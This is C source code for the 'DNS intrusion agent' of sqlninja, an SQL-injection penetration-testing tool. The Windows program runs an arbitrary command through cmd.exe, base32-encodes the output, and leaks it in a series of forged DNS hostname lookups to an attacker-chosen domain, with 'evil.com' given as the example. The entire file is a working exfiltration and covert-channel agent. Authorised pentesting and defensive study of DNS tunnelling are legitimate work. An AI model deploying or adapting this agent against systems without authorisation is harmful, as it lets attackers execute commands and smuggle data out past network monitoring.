/*
 * sqlninja DNS intrusion agent
 * Copyright (C) 2006-2008
 * http://sqlninja.sf.net
 * icesurfer <r00t@northernfortress.net>
 * 
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. 
 */

/*
 * This software is a part of sqlninja.
 * For its goal and utilization, check the README file that you should
 * have received with this file.
 * For more information, check http://sqlninja.sf.net
 */

#include <winsock2.h>  
#include <stdio.h>  
#include <windows.h>
#include <tchar.h>


void buffer_send(char * chBuf, char * domain, unsigned int hostnamelen);
void dnsquery(char * string);

/*
 * Encode the command output in base32, returning the encoded string
 */
char * encode(char *input)
{
	char *encstring, *p;
	static char b32table[32] = "abcdefghijklmnopqrstuvwxyz012345";
	int inputlen, outputlen, mod, i,j;
	
	inputlen = strlen(input);
	mod = inputlen % 5;
	outputlen = ((inputlen/5) + (mod ? 1:0)) * 8 + 1;

	encstring = malloc(sizeof(char)*outputlen);
	if (encstring == NULL) {
		printf("Failed to allocate memory....\n");
		exit(1);
	}

	p = encstring;
	i = 0;
	while (i < inputlen - mod) {
		*p++ = b32table[input[i] >> 3];
		*p++ = b32table[(input[i] << 2 | input[i+1] >> 6) & 0x1f];
		*p++ = b32table[(input[i+1] >> 1) & 0x1f];
		*p++ = b32table[(input[i+1] << 4 | input[i+2] >> 4) & 0x1f];
		*p++ = b32table[(input[i+2] << 1 | input[i+3] >> 7) & 0x1f];
		*p++ = b32table[(input[i+3] >> 2) & 0x1f];
		*p++ = b32table[(input[i+3] << 3 | input[i+4] >> 5) & 0x1f];
		*p++ = b32table[input[i+4] & 0x1f];
		i += 5;
	}
	if (mod == 0) {
		*p = 0;
		return(encstring);
	}
	*p++ = b32table[input[i] >> 3];
	if (mod == 1) {
		*p++ = b32table[(input[i] << 2) & 0x1f];
		for (j=0;j<6;j++) {
			*p++ = 55;
		}
		*p = 0;
		return encstring;
	}
	*p++ = b32table[(input[i] << 2 | input[i+1] >> 6) & 0x1f];
	*p++ = b32table[(input[i+1] >> 1) & 0x1f];
	if (mod == 2) {
		*p++ = b32table[(input[i+1] << 4) & 0x1f];
		for (j=0;j<4;j++) {
			*p++ = 55;
		}
		*p = 0;
		return encstring;
	}
	*p++ = b32table[(input[i+1] << 4 | input[i+2] >> 4) & 0x1f];
	if (mod == 3) {
		*p++ = b32table[(input[i+2] << 1) & 0x1f];
		for (j=0;j<3;j++) {
			*p++ = 55;
		}
		*p = 0;
		return encstring;
	}
	*p++ = b32table[(input[i+2] << 1 | input[i+3] >> 7) & 0x1f];
	*p++ = b32table[(input[i+3] >> 2) & 0x1f];
	*p++ = b32table[(input[i+3] << 3) & 0x1f];
	*p++ = 55;
	*p = 0;	
	return encstring;
}


/*
 * Encode a number in base32. Used to encode the message counter
 */
char * encodecounter(unsigned int counter)
{
	char * encoded;
	char * tmp;
	int i,j;
	static char b32table[32] = "abcdefghijklmnopqrstuvwxyz012345";
	j = 0;
	// todo: change the next two lines to use the correct length
	// right away (a logarithm will do)
	tmp = malloc(sizeof(char)*256);
	if (tmp == NULL) {
		printf("Failed to allocate memory....\n");
		exit(1);
	}
	encoded = malloc(sizeof(char)*256);
	if (encoded == NULL) {
		printf("Failed to allocate memory....\n");
		exit(1);
	}
	if (counter == 0) {
		free(tmp);
		free(encoded);
		return "a";
	}
	while (counter !=0) {
		i = (counter & 0x1F);
		tmp[j] = b32table[i];
		j++;
		counter = counter >> 5;
	}
	// reverse the string and null-terminate it
	for (i = 0;i<j;i++) {
		encoded[i]=tmp[j-i-1];
	}
	encoded[i]=0;
	free(tmp);
	return encoded;
}

/*
 * Launch a process that executes the command. For each chunk of received
 * output, the buffer&send function is called
 */
void execute(char * command, char * domain, unsigned int hostnamelen)
{
	CHAR chBuf[1024]; // buffer that receives the command output chunks
	
	HANDLE hChildStdinRd, 
	       hChildStdinWr, 
	       hChildStdoutRd, 
	       hChildStdoutWr, 
	       hStdout;

	SECURITY_ATTRIBUTES saAttr;
	STARTUPINFO siStartInfo;
	PROCESS_INFORMATION piProcInfo;
	DWORD dwRead,dwWritten;
	
	// Set the bInheritHandle flag so pipe handles are inherited
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;
	
	// Save the handle to the current STDOUT.
	hStdout = GetStdHandle(STD_OUTPUT_HANDLE);

	// Create a pipe for the child process's STDOUT
	if (! CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0)) {
		printf("Stdin pipe creation failed\n");
		exit(1);
	}
	
	
	LPTSTR szCmdline=_tcsdup(TEXT(command));
	
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb=sizeof(STARTUPINFO);
	siStartInfo.hStdError = hChildStdoutWr;
	siStartInfo.hStdOutput = hChildStdoutWr;
	siStartInfo.hStdInput = hChildStdinRd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	if (!CreateProcess(
			NULL,
			szCmdline,
			NULL,
			NULL,
			TRUE,
			0,
			NULL,
			NULL,
			&siStartInfo,
			&piProcInfo
	)) {
		printf( "CreateProcess failed (%d).\n", GetLastError() );
		return;
	}
	CloseHandle(hChildStdoutWr);

	for (;;) {
		if( !ReadFile( hChildStdoutRd, chBuf, 32, &dwRead,
					NULL) || dwRead == 0) break;
		chBuf[dwRead]=0;
		buffer_send(chBuf,domain, hostnamelen);
	}
	buffer_send("_ninja_EOF_",domain, hostnamelen);
}

/* 
 * Given an encoded counter and the domain to use, calculate the amount
 * of data tu be sent in a single DNS request.
 * From the total hostname, we subtract the domain length (plus
 * one for the preceding dot), then we see how many 64-chars pieces can fit
 * in it (plus the remainder), and finally subtract the length of the 
 * encoded counter (plus one for the control character), that must be 
 * included at the beginning of the request
 */
int chunklen(char * ecounter, char * domain, unsigned int hostnamelen)
{
	int x,y,chunk;
	x = (hostnamelen - strlen(domain) - 1) / 64;
	y = (hostnamelen - strlen(domain) - 1) % 64; 
	chunk = 63 * x + y - strlen(ecounter) - 1;
	return chunk;
}

/*
 * Forge the FQDN to send. The input parameters are the following:
 * buffer:   the buffer of encoded data
 * ecounter: the encoded packet counter
 * domain:   the domain, of course (e.g.: evil.com)
 * datalen:  the amount of encoded data to include in the request to make it
 *             exactly hostnamelen bytes. It is measured by chunklen()
 * final:    flag to indicate whether this is the final request to send
 *             8: not final
 *             9: final
 */
char * makednsname(char * buffer, char * ecounter, char * domain,
		int datalen, int final)
{
	char * pdnsname;
	int i,j;
	pdnsname = malloc(sizeof(char)*512);
	if (pdnsname == NULL) {
		printf("Failed to allocate memory....\n");
		exit(1);
	}
	// first the encoded counter...
	strcpy(pdnsname,ecounter);
	// ...then the Last Request flag...
	if (final == 0) {
		strcat(pdnsname,"8");
	} else {
		strcat(pdnsname,"9");
	}
	i = strlen(pdnsname);
	j = 0;
	// ... then the data...
	while (j < datalen) {
		if (((i+1) % 64) == 0) {
			*(pdnsname+i++)=0x2E; // dot
		} else {
			*(pdnsname+i++)=buffer[j++];
		}
	}
	pdnsname[i]=0;
	// ...and finally the domain
	strcat(pdnsname,".");
	strcat(pdnsname,domain);
	return pdnsname;
}

/*
 * Encode the command output and prepare the hostname to be resolved.
 * It uses a double buffer system. The first buffer glues the output
 * fragments into chunks that are multiple of 5 (to minimize padding and 
 * maximize the performance. The chunks are base32 encoded and allocated to
 * a second buffer. From this buffer we take the chunks that finally form
 * the hostnames to be resolved
 */
void buffer_send(char * chBuf, char * domain, unsigned int hostnamelen)
{
	static unsigned int counter = 0;
	static char buffer1[1024]; // first buffer - unencoded
	static char buffer2[1024]; // second buffer - encoded
	char encodeme[1024]; // chunk to be encoded
	char * sendme; // chunk to be sent
	char * ecounter; // encoded version of the counter
	char * p;
	int i,j,last;
	last = 0;
	if (strcmp(chBuf,"_ninja_EOF_") != 0) {
		strcat(buffer1,chBuf);
		i = strlen(buffer1)/5;
		if (i < 10) {
			return; // only chunks > 50 characters...
		}
		strncpy(encodeme,buffer1,i*5);
		encodeme[i*5]=0;
		// shift the remainder of buffer1
		p = &buffer1[i*5];
		strcpy(buffer1,p);
	} else {
		// we are at the end... let's encode what is left in
		// buffer1 and let's go....
		last = 1;
		strcpy(encodeme,buffer1);
	}
	// append the encoded chunk to buffer2
	strcat(buffer2,encode(encodeme));
	ecounter=encodecounter(counter);
	while ((j = chunklen(ecounter,domain,hostnamelen)) < strlen(buffer2)) {
		sendme = makednsname(buffer2,ecounter,domain,j,0);	
		p = &buffer2[j];
		strcpy(buffer2,p);
		dnsquery(sendme);
		counter++;
		ecounter=encodecounter(counter);
	}
	if (last == 1) {
		sendme = makednsname(buffer2,ecounter,domain,strlen(buffer2),1);
		ecounter=encodecounter(counter);
		dnsquery(sendme);
	}
}

/*
 * Send a single request to the DNS server
 * The input string includes the domain
 */
void dnsquery(char * string) 
{
	WORD sockVersion;
	WSADATA wsaData;
	char * addr,i;
	int j;
	sockVersion = MAKEWORD(2, 0);
	WSAStartup(sockVersion, &wsaData);
	struct hostent *hostEntry;
	// printf("%s\n",string);
	hostEntry = gethostbyname(string);
}

/*
 * Return a string containing the command to be executed, linking
 * the arguments
 * e,g.: "cmd.exe /C dir"
 */
char * linkargs(int argc, char *argv[]) {
	char * linkdstr;
	int i,l;
	// calculate command line length
	l = 11; // "cmd.exe /C "
	for (i=3;i<argc;i++) {
		l += strlen(argv[i]);
		l += 1; // the space between args :)
	}
	linkdstr = malloc(sizeof(char)*l);
	if (linkdstr == NULL) {
		printf ("failed to allocate memory...\n");
		exit(1);
	}
	strcpy(linkdstr,"cmd.exe /C ");
	for (i=3;i<argc;i++) {
		strncat(linkdstr,argv[i],strlen(argv[i]));
		strcat(linkdstr," ");
	}
	return linkdstr;
}

/*
 * argv[1] : domain to contact
 * argv[2] : maximum hostname length
 * argv[3+]: command to execute + parameters
 */
int main(int argc, char *argv[]) 
{ 
	char * command;
	char * domain;
	unsigned int hostnamelen;
	if (argc < 4) {
		printf ("Usage: %s <domain> <hostnamelen> <command> "
						"<parameters...>\n", argv[0]);
		exit(0);
	}
	domain = argv[1];
	hostnamelen = atoi(argv[2]);
	if ((hostnamelen > 255) || (hostnamelen < 0)) {
		printf ("hostname length must be positive and less than 256\n");
		exit(0);
	}
	if (strlen(domain) > 253) {
		printf("Domain name too long\n");
		exit(0);
	}
	command = linkargs(argc,&argv[0]);
	printf ("command: %s\n",command);
	execute(command,domain,hostnamelen);
}
